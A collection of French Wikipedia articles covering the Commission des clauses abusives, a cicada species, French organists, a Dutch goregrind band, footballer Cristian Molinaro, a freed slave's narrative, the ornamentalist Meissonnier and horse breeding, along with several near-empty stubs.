Le directeur général de l’INC ou son représentant peut participer aux séances de la commission des clauses abusives. Il ne prend pas part aux votes sur les recommandations et avis.
Le président et les membres de la commission sont nommés par arrêté du ministre chargé de la consommation pour un mandat de trois ans, renouvelable une fois.
Missions.
Les consommateurs peuvent s'appuyer sur les avis et les recommandations émis par la Commission des clauses abusives afin de régler un litige avec un professionnel.
Les recommandations.
La commission des clauses abusives peut être saisie pour recommandation par le ministre chargé de la consommation, par des associations agréées de défense des consommateurs ou par le professionnel intéressé. Selon l’article L. 822-5 du code de la consommation, elle peut également se saisir d’office.
Elle examine les modèles de contrats habituellement proposés par les professionnels aux consommateurs et recommande la suppression ou la modification des clauses qui ont pour objet ou pour effet de créer, au détriment du non-professionnel ou du consommateur, un déséquilibre significatif entre les droits et obligations des parties au contrat. 
Les avis.
La commission peut être saisie par un juge à l’occasion d’une instance pour donner son avis sur le caractère abusif d’une clause contractuelle. Cependant, il faut noter que l’avis ne lie pas le juge. La Commission fait connaitre son avis dans un délai maximum de trois mois à compter de sa saisine (Article R. 822-11 du code de la consommation).
Les propositions de modifications législatives.
La CCA est aussi en mesure d’émettre les propositions de modifications législatives ou réglementaires qui lui paraissent souhaitables. Ces propositions figurent dans le rapport d’activité de l’Institut national de la consommation, qui est remis au Président de la République et au Parlement et est rendu public (article R. 822-3 du code de la consommation).
Fonctionnement.
La Commission se réunit en formation plénière. 
Lorsqu’elle est saisie, ou de sa propre initiative, la Commission peut demander à la Direction générale de la concurrence, de la consommation et de la répression des fraudes (DGCCRF) de procéder à la collecte des modèles de contrats proposés dans un secteur économique déterminé. Ces contrats sont remis au rapporteur désigné par la Commission.
Elle examine ainsi le pré-rapport établi par le rapporteur. Le rapport adopté est ensuite communiqué aux parties intéressées du secteur concerné, qui sont invitées à présenter leurs observations à la Commission en présence du rapporteur.
À la suite de cette audition, le rapporteur élabore un projet de recommandation. Ce projet est soumis à la Commission qui en arrête le texte définitif.
Chaque année la Commission établit un rapport d’activité qui est consultable sur son site internet (mettre le lien externe).
Historique des recommandations.
2017 : Contrats d'assurance complémentaire santé (17-01) ; Contrats relatifs aux Services de médias audiovisuels à la demande (SMAD) (17-02)
2016 : Contrats de déménagement, garde-meubles et stockage en libre-service (Nouveau) (16-01)
2014 : Contrats de fourniture de gaz et d'électricité (14-01) ; Contrats de fourniture de services de réseaux sociaux (14-02)
2013 : Location non saisonnière de logement meublé (13-01)
2012 : Syndics de copropriété (11-01) ; Services à la personne (12-01)
2010 : Soutien scolaire (10-01) ; Recommandation n° 10-02 relative aux contrats de prévoyance obsèques (10-02) 
2008 : Transports terrestres collectifs de voyageurs (complétant la recommandation n° 84-02) (08-03)
2007 : Services groupés de l'internet, du téléphone et de la télévision ("triple play") (07-01) ; Contrats de vente mobilière conclue par internet (07-02) ; Fourniture de voyages proposés sur internet (08-01) ; Contrats proposés par certains établissements hébergeant des personnes âgées et non habilités à recevoir des bénéficiaires de l'aide sociale (08-02)
2005 : Hôtellerie de plein air et locations d'emplacements de résidence mobile (05-01) ; Conventions de comptes bancaires (05-02) ; Auto-école (permis B) (05-03)
2004 : Insectes xylophages (04-01) ; Achat de véhicules automobiles de tourisme (04-02) ; Prêt immobilier (04-03)
2003 : Agences immobilières (03-02)
2002 : Vente de listes en matière immobilière (02-01) ; Assurance de protection juridique (02-03) ; Accès à l'internet (FAI) (03-01)
2001 : Distribution d'eau (complémentaire à la n° 85-01 du 19 novembre 1982) (01-01) ; Durée des contrats conclus entre professionnels et consommateurs (01-02) ; Formules d'accès au cinéma donnant droit à des entrées multiples (02-02)
2000 : Location de locaux à usage d'habitation (complétant la n° 80-04) (00-01)
1999 : Dépôt-vente (99-01) ; Radiotéléphones portable (mobiles) (99-02)
1998 : Abonnement au câble et à la télévision à péage (98-01)
1997 : Télésurveillance (97-01) ; Maintenance de certains équipements d'immeubles (97-02)
1996 : Locations de véhicules automobiles (96-02) ; Révélation de succession par les généalogistes (96-03)
1995 : Abonnement autoroutier (95-01) ; Contrats proposés par les éditeurs ou distributeurs de logiciels ou progiciels destinés à l'utilisation sur micro-ordinateurs (95-02) ; Syndics de copropriété (96-01)
1994 : Bons de commande et contrats de garantie des véhicules d'occasion (94-05) ; Séjours linguistiques (94-03) ; Locations saisonnières (94-04)
1991 : Contrats porteurs des cartes de paiement assorties ou non d'un crédit (94-02)
1990 : Contrats conclus entre professionnels et non-professionnels ou consommateurs (dite de synthèse) (91-02) ; Construction de maisons individuelles selon un plan établi à l'avance et proposé par le constructeur (complétant la n°81-02) (91-03) ; Location de certains biens mobiliers autres que les véhicules automobiles (91-04)
1989 : Assurance des véhicules automobiles de tourisme (89-01) ; Etablissements d'enseignement (91-01) ; Assurance complémentaire à un contrat de crédit à la consommation ou immobilier ou à un contrat de location avec option d'achat (90-01) ; Contrats d'assurance dénommés "dommages ouvrages" (90-02)
1988 : Accession à la propriété immobilière (88-01)
1987 : Agences matrimoniales (87-02) ; Clauses dites de consentement implicite (94-01) ; Clubs de sport à caractère lucratif (87-03)
1986 : Location avec option d'achat ou promesse de vente de biens de consommation (86-01) ; Remontées mécaniques dans les stations de sports d'hiver (86-02) ; Location de coffres-forts (87-01)
1985 : Etablissements hébergeant des personnes âgées (85-03) ; Contrats d'assurance dénommés "multirisques habitation" (85-04)
1984 : Fourniture de gaz de pétrole liquéfié (GPL) en vrac et de mise à disposition ou de vente de réservoir (84-01) ; Transport terrestre de voyageurs (84-02) ; Achat de véhicules automobiles de tourisme (85-02)
1983 : Contrats d'hôtellerie de plein air (84-03)
1982 : Déménageurs (82-02) ; Installation de cuisine (82-03) ; Droit à réparation en cas de perte ou de détérioration des films confiés à des laboratoires photographiques ou cinématographiques (82-04) ; Contrats de distribution de l'eau (85-01)
1981 : Contrats proposés par les transporteurs terrestres de marchandises et les commissionnaires de transport (82-01)
1980 : Location d'emplacements destinés à l'affichage publicitaire (80-01) ; Formation du contrat (80-03) ; Location de locaux à usage d'habitation (80-04) ; Achat d'objets d'ameublement (80-05) ; Délai de livraison (80-06) ; Construction de maisons individuelles selon un plan établi à l'avance et proposé par le constructeur (81-02) ; Équilibre des obligations en cas d'inexécution des contrats (81-01)
1979 : Contrats de vente immobilière imposant à l'acquéreur la continuation de l'assurance souscrite par le vendeur (80-02) ; Recours en justice (79-02)
1978 : Contrats de garantie (79-01)

</doc>
<doc id="1874103" url="https://fr.wikipedia.org/wiki?curid=1874103" title="Cicadetta cantilatrix">
Cicadetta cantilatrix

Cicadetta cantilatrix est une espèce d'insectes hémiptères de la famille des Cicadidae (cigales).
Elle a été découverte en 2007 dans les Yvelines et le Val-d'Oise, à la suite de prospections entomologiques sur les pelouses de la Réserve Naturelle Nationale des Coteaux de la Seine. C'est la cinquième espèce du genre "Cicadetta" découverte en France. Elle est aussi présente en Ardennes.
Systématique.
L'espèce "Cicadetta cantilatrix" a été décrite en 2007 par les entomologistes français et .
Étymologie.
Son épithète spécifique, "cantilatrix", dérive du latin "", « chanter, fredonner ». 

</doc>
<doc id="1874104" url="https://fr.wikipedia.org/wiki?curid=1874104" title="Louis-Claude D'Aquin">
Louis-Claude D'Aquin



</doc>
<doc id="1874106" url="https://fr.wikipedia.org/wiki?curid=1874106" title="Liste des voies d'Auderghem">
Liste des voies d'Auderghem

Auderghem, commune belge située dans la région de Bruxelles-Capitale, possède de nombreuses rues toutes répertoriées dans cette liste.

</doc>
<doc id="1874115" url="https://fr.wikipedia.org/wiki?curid=1874115" title="René Drouard du Bousset">
René Drouard du Bousset

René Drouard du Bousset ( − ) fut un important organiste français, coorganiste de la cathédrale Notre-Dame de Paris. Pendant la même période (1756-1760), il tint l'orgue de l'église Saint-Merri, à Paris (il fut nommé survivancier du titulaire, Nicolas-Gilles Forqueray, à partir de 1756). Il est le fils du compositeur et chanteur Jean -Baptiste de Bousset et de Marguerite de Sequeville.
Janséniste, il fut un des plus ardents partisans des « convulsionnaires », forme tardive qu'avait prise ce courant de pensée religieux, né au et rejeté par le roi Louis XIV puis par l'orthodoxie catholique (Bulle "Unigenitus", 1713). Le catalogue de ses œuvres, établi par Felicity Smith est publié par le CMBV en 2020. 
Discographie.
"IIe ODE de M. Rousseau tirée du pseaume XVIII à deux voix, dessus &amp; basse chantante avec la basse-continue", (1740), dans Jean-Baptiste Rousseau Poésies mises en musique. Cécile Van Watter ; Guillaume Durant ; Ensemble Almazis, dir. Iakovos Pappas (7, 9 &amp; 10 juillet 2020, MAG 358.427).

</doc>
<doc id="1874117" url="https://fr.wikipedia.org/wiki?curid=1874117" title="SC Selongey">
SC Selongey



</doc>
<doc id="1874121" url="https://fr.wikipedia.org/wiki?curid=1874121" title="Rompeprop">
Rompeprop

Rompeprop est un groupe de goregrind néerlandais, originaire d'Eindhoven. Le groupe est formé en 2001, et compte au total deux albums, deux splits, et un EP.
Biographie.
Le groupe est formé en 1999 à Eindhoven, lors d'une rencontre entre Jores (batterie), Dente (guitare) et Steven (chant), qui partageront les mêmes goûts musicaux. Inspiré par les chansons de groupes comme Utopie, Impetigo ou Haemorrhage, le groupe commence à répéter, mais ne se consolide réellement que deux ans plus tard avec l'arrivée du bassiste Michiel. Les premières représentations scéniques du groupe s'effectuent en 2001 lors du festival Fuck the Commerce et au célèbre club Dynamo à Eindhoven. Immédiatement après leur performance, le groupe signe avec le label Dismemberment Records. Ils publient ensuite l'EP "Menstrual Stomphulk" (Bizarre Leprous). En 2002, le groupe effectue de nombreux concerts à succès. 
En mars 2003, le groupe perce avec la sortie de son premier album studio, '. Dès ce moment, ils sont bien accueillis par la presse spécialisée, et Mortician les invite même à une tournée américaine en 2004. Dans le même temps, l'ancien chanteur, Steven, est contraint de quitter le groupe, incapable de concilier obligations professionnelles et apparitions dans le groupe, qui mèneront à des problèmes de santé. Avant, le groupe enregistre un split, ', avec Tu Carne. Les membres restants partent et le groupe recrute la chanteuse Dentemu avant de retourner sur scène comme trio. Leur première apparition en trio s'effectue au Just Killers Just No Fillers Fest en Allemagne. En 2006, le groupe enregistre un split intitulé "" avec GUT, publié au label polonais Everydayhate. Après un autre changement de formation (en 2007, Rob rejoindra Bonebag à la place de Michiela à la basse), le groupe entame une tournée internationale, avec notamment un concert au Mexique, passant par la Colombie ou même l'Inde. 
En 2011, le groupe enregistre son dernier album studio, "Gargle Cummics" publié au label tchèque Bizarre Leprous. Le groupe est souvent invité à tous les festivals de musique extrême, comme l'Obscene Extreme en République tchèque, la Fekal Party et le Bloodshed Festival aux Pays-Bas. En avril 2016, le groupe annonce sa séparation et reste inactif en 2017. 
Style musical.
Le style musical du groupe s'oriente goregrind, un dérivé du grindcore. En raison de leurs paroles explicites, leur genre est souvent considéré comme du pornogrind. Malgré cela, les paroles du groupe ne jouent pas un rôle important dans leur musique.

</doc>
<doc id="1874122" url="https://fr.wikipedia.org/wiki?curid=1874122" title="Box-office France 2005">
Box-office France 2005

Cet article traite du box-office cinéma de 2005 en France. 

</doc>
<doc id="1874125" url="https://fr.wikipedia.org/wiki?curid=1874125" title="Kouffo">
Kouffo



</doc>
<doc id="1874127" url="https://fr.wikipedia.org/wiki?curid=1874127" title="Cristian Molinaro">
Cristian Molinaro

Cristian Molinaro, né le 30 juillet 1983 à Vallo della Lucania, est un footballeur international italien. Il joue principalement arrière latéral gauche mais peut jouer aussi sporadiquement milieu gauche. Il est surnommé "Mirtillo", "Pendolino" ou encore "Cristone".
Carrière en club.
Il a commencé à jouer à 5 ans pour à Vallo della Lucania dans la région de la Campanie, avant de partir dans le club majeur de la région : Salernitana où il poursuit sa formation dans les différentes équipes de jeunes.
Lors de la saison 2002-2003, il fait ses débuts en Serie B. Il s'impose progressivement comme un titulaire indiscutable dans le club de la ville de Salerne. Il marque son premier but professionnel lors de la saison 2004-2005 dans un match contre Bari. En 2005, il signe à l'AC Sienne, en copropriété avec le club de la Juventus. Il fait ses débuts en Serie A le 18 septembre 2005 à Sienne face à Palerme. Sa première saison dans l'élite est caractérisé par des hauts et des bas. Sa deuxième saison est bien meilleur et il s'impose définitivement dans l'élite (il joue 36 matchs sur 38).
Le 20 juin 2007, la Juventus le rachète pour une somme de 2,5 millions d'euros. A 24 ans, il gagne sa place de titulaire sur le flanc gauche de la défense dès sa première saison en profitant du passage de Giorgio Chiellini en défense centrale.
Lors de sa deuxième saison à la Juventus, il découvre la Ligue des champions. Le 13 août 2008, il joue le match aller du troisième tour de qualification de la Ligue des Champions, remporté 4-0 contre Artmedia Petržalka. Le 28 novembre 2008, il prolonge son contrat avec la Juventus jusqu'en 2013. Il termine la saison 2008-2009 prématurément en raison d'un hématome péri-rénal.
Avec l'arrivée de l'international italien Fabio Grosso et de l'international uruguayen Martín Cáceres lors du mercato d'été 2009, Cristian Molinaro perd sa place dans l'effectif. Il est alors prêté le 5 janvier 2010 au VfB Stuttgart lors du mercato d'hiver. Le juin 2010, le VfB Stuttgart lève l'option d'achat à la suite de sa bonne demi-saison. Il signe alors pour 4 ans jusqu'en 4 ans. La Juventus annonce qu'elle a reçu 3,9 millions d'euros de la part du club allemand pour lever l'option d'achat. Il réalise ensuite trois bonnes saisons où il joue régulièrement. Mais pour sa dernière saison, il ne joue qu'une seule fois. Le club souhaitant le voir partir, il signe alors au Parme FC et revient ainsi en Italie. Le 16 février 2014, il marque son premier but avec le maillot de Parme(c'est aussi son premier en Serie A).
Le 16 juin 2014, Cristian Molinaro signe au Torino FC pour un an. Il fait ses débuts avec son nouveau club lors du troisième tour de la Ligue Europa 2014-2015 contre Brommapojkarna. Le 25 juin 2015, le Torino prolonge son contrat jusqu'à la fin de la saison.
Carrière internationale.
Cristian Molinaro reçoit sa première convocation internationale le 6 août 2010. Il est appelé par le nouvel entraîneur de l'équipe d'Italie : Cesare Prandelli. Il a fait ses débuts ,le 10 août 2010, face à la Côte d'Ivoire. Il ne connaît ensuite plus de sélections sous le maillot azurri. Il est tout de même rappelé dans le groupe pour les matchs face l'Estonie et les Iles Féroé lors éliminatoires de l'Euro 2012.

</doc>
<doc id="1874131" url="https://fr.wikipedia.org/wiki?curid=1874131" title="Comté de Rusk">
Comté de Rusk

Deux comtés des États-Unis portent le nom de comté de Rusk ("") :

</doc>
<doc id="1874133" url="https://fr.wikipedia.org/wiki?curid=1874133" title="Comté de Sumner (Kansas)">
Comté de Sumner (Kansas)

Le comté de Sumner est l’un des 105 comtés de l’État du Kansas, aux États-Unis, à la frontière avec l’Oklahoma. Il a été fondé le 20 décembre 1870.
Son siège et plus grande ville du comté : Wellington.
Le 26 février 1867, le comté de Sumner a été créé à partir des comtés de Marion et de Butler. Il a été nommé en l’honneur de Charles Sumner, un sénateur américain du Massachusetts (1811-1874), qui était un ardent défenseur du Kansas comme État libre.

</doc>
<doc id="1874142" url="https://fr.wikipedia.org/wiki?curid=1874142" title="New York dans la littérature">
New York dans la littérature

Les œuvres de la littérature, moderne ou classique qui ont pour cadre New York sont très nombreuses. En effet, comme c'est le cas dans le domaine de la télévision, la ville de New York a été et demeure une source d'inspiration pour de nombreux écrivains, parfois eux-mêmes originaires de la ville, qui ont soit consacré leur livre à New York, soit pris "Big Apple" comme cadre pour leur histoire. Voici les œuvres les plus célèbres qui mettent en scène New York.

</doc>
<doc id="1874145" url="https://fr.wikipedia.org/wiki?curid=1874145" title="Ukawsaw Gronniosaw">
Ukawsaw Gronniosaw

Ukawsaw Gronniosaw (né vers 1710 et mort en 1775) était un esclave émancipé et un écrivain. Il est connu également sous le nom James Albert Ukawsaw Gronniosaw.
Vie.
Gronniosaw naquit probablement dans le Bornou, au nord-est du Nigeria, d'une famille royale. Le grand-père de Gronniosaw aurait été le roi de Bornou. En cela, Gronniosaw présente des points communs avec un autre africain d'extraction noble, Ayuba Suleiman Diallo, qui fut lui aussi réduit à l'état d'esclave.
Enlevé dans son pays, Gronniosaw fut acheté par un négrier hollandais et vendu par celui-ci pour 50 dollars à un certain Vanhorn, qui en fit son domestique dans son domicile de New-York. Plus tard il aura d'autres propriétaires. Gronniosaw apprit l'anglais et embrassa la foi chrétienne.
Son témoignage.
Son "A Narrative of the Most Remarkable Particulars in the Life of James Albert Ukawsaw Gronniosaw, an African Prince" est le premier témoignage d'esclave en langue anglaise. Publié en 1772, il fournit un témoignage vivant de la vie de Gronniosaw, depuis son enlèvement en Afrique en passant par l'esclavage et jusqu'à une vie de pauvreté à Colchester et Kidderminster. Cette dernière ville l'attira car elle avait été la ville de Richard Baxter, un religieux calviniste du , très admiré par Gronniosaw.

</doc>

<doc id="3214281" url="https://fr.wikipedia.org/wiki?curid=3214281" title="Juste-Aurèle Meissonnier">
Juste-Aurèle Meissonnier

Juste-Aurèle Meissonnier (ou "Meissonier"), né en 1695 à Turin et mort en 1750 à Paris, est un dessinateur, peintre, sculpteur, architecte, ornemaniste et orfèvre français.
Biographie.
Juste-Aurèle est le fils d'un orfèvre provençal travaillant en Italie ; il s'installe à Paris vers 1715.
Considéré par ses contemporains comme l'un des chefs de file de la rocaille, il fait partie des artistes qui ont eu le plus d’influence sur le goût du . Orfèvre du roi (1724), dessinateur de la chambre et du cabinet du roi (1726), il est aussi ordonnateur des fêtes et pompes funèbres royales, Meissonnier montra dans l'exercice de toutes ces charges un génie fécond. 
Aujourd'hui, il doit surtout sa renommée à son œuvre gravé, publié de 1734 à 1742 par la veuve de François Chéreau puis par Gabriel Huquier. On ne connaît pas avec exactitude les dates de publication de ces planches qui n'étaient pas ordinairement vendues en livres, mais à la feuille ou au cahier. C'était l'acheteur qui, après avoir fait un choix de gravures, les faisait éventuellement relier. Les planches gravées par Laureolly font partie de la première livraison de 1734 , celles plus tardives, et qui sont aussi les plus nombreuses, sont le plus souvent gravées par Huquier. Les datations que l'on trouve parfois au bas des gravures sont en fait des millésimes correspondant à l’œuvre dessinée ou réalisée et non pas à l'œuvre gravé . 
Les modèles d’orfèvrerie de Meissonnier sont restés très célèbres, ils font preuve de la plus grande invention et de la plus grande originalité. Le "Livre" de modèles le plus connu est le "Douzième Livre des Œuvres", il s'agit en fait d'un cahier de seulement cinq feuilles (vignettes 73 à 77) représentant des chandeliers d'argent ; parmi ces chandeliers se trouve le modèle du célèbre candélabre du duc de Kingston que l'on peut voir sur le site du musée des Arts décoratifs. Bien qu'orfèvre lui-même, Meissonnier était surtout ornemaniste et il faisait le plus souvent exécuter ses projets par d'autres, en particulier par l'orfèvre Claude Duvivier. 
Les planches gravées de Meissonnier, comme celle du magnifique frontispice in folio du graveur Pierre-Alexandre Aveline, ont contribué à la diffusion européenne du style rocaille, encore nommé rococo : "Ce sont des Fontaines, des Cascades, des Ruines, des Rocailles, et Coquillages, des morceaux d'Architecture, qui font des effets bizarres, singuliers et pittoresques, par leurs formes piquantes et extraordinaires, dont souvent aucune partie ne répond à l'autre, sans que le sujet en paraisse moins riche et moins agréable." Meissonnier est l'un des premiers ornemanistes, avec Nicolas Pineau, et Jacques de Lajoüe, à abandonner la symétrie pour adopter des modèles à faces inégales, des formes déjetées, basculées, enroulées ou torsadées, des motifs de coquillages et de végétaux exubérants. 
Meissonnier dessina aussi de nombreux projets d'architecture pour Paris (église Saint-Sulpice, place royale...) dont aucun ne réussit à aboutir. Sa seule réalisation effective, en tant qu'architecte, est l'hôtel particulier de Léon de Brethous, financier, armateur et maire, à Bayonne (1729-1734).

</doc>
<doc id="3214282" url="https://fr.wikipedia.org/wiki?curid=3214282" title="Philip Nolan">
Philip Nolan

Philip Nolan (Belfast, 1771 — ) est un marchand de chevaux, flibustier et explorateur irlando-américain.
Biographie.
Il vécut à Natchez (Mississippi) et dans le Texas espagnol. Protégé par le général James Wilkinson dont il est le secrétaire, il voyage pour la première fois au Texas en 1791. Il entre en contact avec les Indiens Comanches et Taovayas, qui lui fournissent des chevaux mustangs.
Ses observations servent à dessiner la frontière entre le Texas et la Louisiane vers 1804. Il est tué par des soldats espagnols en mars 1801 dans la région de Nacogdoches.

</doc>
<doc id="3214283" url="https://fr.wikipedia.org/wiki?curid=3214283" title="Élevage équin">
Élevage équin

L'élevage équin est l'activité visant à faire naître des équidés domestiques appartenant aux espèces "Equus caballus" (cheval), "Equus asinus" (âne) ou des mulets, hybrides des deux précédents, au profit des activités humaines. Il peut fournir des animaux destinés aux sports équestres et hippiques, aux loisirs, à la défense, au cinéma, ou encore à la traction. L'élevage équin fournit également des produits issus de ces animaux, comme la viande, le lait, le cuir, l'engrais, l'amendement (fumier, sang séché, déchets d'abattoir), et la gonadotrophine chorionique équine.
Le processus d'élevage a conduit à la domestication du cheval et à l'émergence de races spécialisées. Ces productions agricoles sont encadrées et se doivent donc, dans l'Union européenne, de satisfaire aux règles du « paquet hygiène » quand elles sont obtenues dans un cadre professionnel. Au niveau international, les règles sont posées par l'office international des épizooties ou organisation mondiale de la santé animale, d'une part, et le codex alimentarius d'autre part.
Toutes les activités liées à l'élevage équin sont administrativement considérées, en France, comme relevant du secteur agricole.
Histoire.
Les premiers élevages de chevaux remontent à l'Antiquité. C'est historiquement un enjeu politique, mais l'intérêt des historiens pour ce sujet, difficile pour eux à théoriser, a toujours été faible, en particulier dans la société européenne, où une classe d'écuyers considérée comme privilégiée s'occupe de l'élevage et de l'utilisation des animaux en imposant ses critères. Leur pensée intellectuelle est restée étrangère aux préoccupations du peuple. Une autre raison réside dans l'aspect militaire de cet élevage, bien que quelques historiens militaires comme André Corvisier l'aient étudié, l'élevage équin reste un domaine à part, Daniel Roche parlant même d'un « ésotérisme cavalier ». Le cheval étant très présent dans la vie quotidienne, il a peu attiré l’intérêt des historiens.
L'élevage britannique a une grande réputation, les Anglais estiment « avoir inventé » le fleuron de l'élevage hippique mondial, le Pur-sang, et la monte à l'anglaise devenue la monte cavalière de loisir par excellence.
Le développement des haras nationaux en France, indissociable de l'absolutisme, touche la société puisque l'état tente de contrôler et de centraliser l'élevage des chevaux. Les éleveurs privés se sentent dépossédés. Le royaume de France a alors besoin de chevaux pour remonter ses troupes, et l'élevage est surtout orienté sur la qualité des étalons, les juments n'entrant pas en ligne de compte (ce qui est une erreur), contrairement à ce qui se passe en Angleterre : les haras français ne recèlent que des étalons. L'idée dominante semble être qu'en croisant un grand et bel étalon à une petite jument, le produit sera amélioré car l'étalon est dominant. De plus, la royauté et les haras recherchent un type de cheval, ils ne raisonnent pas en termes de races mais en termes de type, ce qui provoque la disparition de certaines races par le croisement. Les principales régions françaises d'élevage du cheval de selle à l'époque de la Révolution française sont la Normandie et le Limousin. La sélection du cheval de guerre est particulière, les spécialistes savent qu'un Pur Sang n'est pas un bon choix et que les bidets rustiques de Bretagne capables de se nourrir d'ajoncs résistent bien mieux aux privations et aux fatigues des combats que le « beau cheval ».
Certains hippiatres cherchent à concilier « le beau et le bon » chez le cheval, en accordant la production régionale aux besoins du pays. Les conflits en termes d'élevage y trouvent leur origine.
Spécificités des élevages équins.
Le terme d'équin rassemble le cheval, l'âne, et même le zèbre puisqu'il existe des hybrides issus de ces trois espèces. Toutefois, l'élevage équin concerne généralement le cheval. Les métiers d'élevage équin, dont l'éleveur est l'acteur principal, sont liés à la sélection de différents équidés dans le but d'en faire le commerce. L'éleveur supervise l'ensemble des opérations visant à faire se reproduire ces animaux au profit de l'activité humaine. Il fournit des équidés et des produits issus des équidés (viande de cheval, viande d'âne, fumier, parfois cuir et lait d'ânesse ou lait de jument) et met à disposition ses animaux reproducteurs (étalon et poulinière).
La conduite d'une orientation pour l’élevage est plus longue et complexe pour le cheval que pour d'autres animaux domestiques de taille plus réduite. L'intervalle de génération est de cinq à six ans minimum, les animaux sont d'une grande longévité (vingt-cinq ans en moyenne) et les juments ne mettent bas qu'un poulain à la fois (sauf exception), une fois par an. De ce fait, la production d'un cheval adapté à une situation socio-économique particulière est difficile.
Si le modèle des poulains qui naissent est relativement fixé dès la naissance, les éleveurs et l'environnement influencent leur caractère.
Conditions requises.
L'élevage équin requiert une certaine surface et des équipements. Une vaste zone herbagère sur sol portant est préférable pour des raisons économiques. Un climat océanique est plus adapté car sous climat continental, l'herbe pousse moins longtemps, ce qui entraîne des coûts supplémentaires en nourriture. Trop d'humidité n'est pas souhaitable car cela favorise le développement de parasites, de plus le cheval tolère mal l'humidité stagnante. Il faut également prévoir la nourriture, et de la paille. La proximité des services vétérinaire et de maréchalerie est aussi à prendre en compte.
Le ration conseillé est d'un cheval par hectare de pâture, il peut varier légèrement selon le type de cheval choisi : les juments poulinières de course et de sport, moins rustiques, peuvent demander deux hectares. Les bovins et les ovins peuvent partager sans risques les pâtures des chevaux, tout en se nourrissant de végétaux refusés par ces derniers. Les conditions d'élevage des chevaux peuvent varier énormément selon la race choisie, certaines étant plus rustiques que d'autres. Les chevaux sont plus ou moins exigeants en nourriture, plus ou moins sensibles aux variations du climat, et plus ou moins sujets au maladies ou aux problèmes de pied. On considère que la race la plus fragile est le Pur-sang, suivie des chevaux proche du sang de type trotteur ou Selle français. Les chevaux Arabes sont assez rustiques, poneys et chevaux de trait, dits « à sang froid », sont les moins exigeants.
Clôture et hébergement.
Une bonne clôture de pâture à chevaux doit avant tout être visible, solide, et suffisamment haute pour que le cheval ne puisse pas passer par-dessus. Le fil de fer barbelé ou torsadé est à proscrire car très dangereux, il cause de graves blessures. Il faut, dans les cas où il n'est pas possible de le remplacer, le doubler avec une clôture électrique à l'intérieur, afin que les chevaux ne puissent pas s'en approcher. Les poteaux complétés de lisses en bois et les haies épaisses sont les meilleurs choix.
Un aménagement minimal de la pâture est nécessaire. Il vaut mieux assécher les mares et trous d'eau, ou en empêcher l'accès pour éviter des accidents, et placer un abreuvoir remplit régulièrement. Les épineux, comme les ronces, doivent également être ôtés.
Toute pâture doit comporter un abri permettant au cheval de se protéger des intempéries, en particulier de la pluie.
Nourriture.
En pâture, les équidés se nourrissent d'herbe, mais il faut prévoir des compléments à base de foin et de céréales, comme l'avoine.
Gestion de la reproduction.
Pour les chevaux de sport, l'insémination artificielle est très répandue. La monte en liberté est fréquente pour des élevages de poneys ou de chevaux de loisir.
Impact économique.
L'organisation des Nations unies pour l'alimentation et l'agriculture (FAO) estime qu'en 2013, il y avait un peu plus de 58 millions de chevaux dans le monde, dont près de millions en Amérique, millions en Asie, millions en Afrique, et millions en Europe. Les États-Unis comptent à eux seuls près de millions de chevaux en 2013. Le cheptel d’équidés français est estimé à fin 2010, ceux de l’Allemagne et du Royaume-Uni à un million chacun en 2009. Ces trois pays totalisent plus de la moitié du cheptel équin européen.
Types d'élevages.
Courses.
Les chevaux naissent dans des haras spécialisés dans la sélection. Ils peuvent être mis en vente aux enchères, vendus et placés par leur propriétaire dans des haras qui se chargeront de les entraîner et de les faire courir. Après leur carrière, ils sont destinés ou non à la reproduction en fonction des résultats. En 2013, aux États-Unis et en Europe, il s'est vendu au total chevaux de course aux enchères, pour un prix moyen de . Les gains générés par les victoires aux courses peuvent être substantiels. Par exemple, le cheval appelé « Lawman » vendu yearling à un prix de en 2005 a rapporté à son propriétaire en 2007. Certains investisseurs créent des sociétés pour les acquérir et louent des places dans les haras pour les entraîner et les faire courir.
Courses de galop.
Le pur-sang anglais est presque l'unique race élevée pour les courses de galop, chaque année voyant l'enregistrement d'environ nouvelles naissances. L'industrie des courses est le premier demandeurs de chevaux.
Au milieu des années 2000, en France, un "foal" de niveau moyen destiné au galop valait autour de . Les meilleurs chevaux de plat se négocient à plusieurs millions d'euros.
Courses de trot.
Des races spécifiques sont élevées pour les courses de trot, notamment le trotteur français, le trotteur américain et le trotteur d'Orlov.
Un trotteur valait en moyenne en France en 2008 . 
Sports équestres.
Ce type d'élevage vise à faire naître des chevaux performants dans les sports équestres, en particulier les disciplines olympiques comme le saut d'obstacles, le dressage et le concours complet d'équitation. Le haras de Zangersheide s'est, par exemple, spécialisé dans la production de chevaux destinés au saut d'obstacles.
Le prix d'un cheval de sport est extrêmement variable, selon son âge, son degré de préparation, et son potentiel en compétition (niveau). Le prix moyen des chevaux de 3 ans vendus aux enchères en 2012 en France est de , mais peu grimper à près de , lors des ventes Fences. Le prix moyen aux enchères de chevaux de sport de race Westphalien, Oldenbourg, Holsteiner, Hanovrien et KWPN, lors de ventes européennes « Elite » entre 2010 et 2015, oscille entre à . D'autre part, pour les mâles aux résultats sportifs remarquables, la semence pour l'insémination artificielle est une source de revenus non négligeable.
Loisirs.
La production de chevaux et d'ânes peut avoir pour but de les revendre comme animaux de loisir à des particuliers ou des centres équestres. Les chevaux de couleur comme le cheval crème, le palomino ou l'appaloosa sont ainsi très appréciés, en particulier aux États-Unis.
Cette filière des chevaux destinés au loisir est plus traditionnelle et est moins formalisée. Un trotteur français vendu pour pratiquer l’équitation d’extérieur vaut dans les en moyenne en 2010, un cheval d'origine non constaté dans les . 
Travail.
Dans plusieurs pays, le cheval est encore employé pour la garde des troupeaux, notamment en Mongolie, en Argentine ou, de façon plus marginale, dans la région de Camargue ou en Espagne. Cela peut aussi correspondre à un folklore ou une tradition.
Le cheval est aussi utilisé pour la traction hippomobile, activité traditionnelle qui connaît un certain regain en France avec le statut de cheval territorial.
Viande.
La production de chevaux, principalement des races de trait, et d'ânes pour le commerce de leur viande est une activité qui consiste à élever des animaux jusqu'à l'âge d'environ dix-huit mois pour les revendre au poids à des abattoirs qui alimentent ensuite les boucheries chevalines.
Métiers.
Les métiers de l'élevage équin sont essentiellement ceux d'éleveur, d'étalonnier, et d'inséminateur. Les éleveurs sont amenés à travailler étroitement avec d'autres professionnels de la filière tels que les maréchaux-ferrants, marchands de chevaux et vétérinaires.
Responsable d'élevage et agent d'élevage.
On distingue le responsable d’élevage, qui peut être employé dans un élevage de grande taille ou à son compte, et dont la mission est d'entretenir les chevaux, de faire naître et d’élever les poulains jusqu’à leur vente et d'optimiser sa stratégie de vente selon le marché où il se positionne, de l'agent d'élevage dont les missions sont plus limitées : soins courants, entretien de l’écurie, des prairies et du matériel, récolte du fourrage et des céréales. Il peut parfois éduquer et débourrer les chevaux.
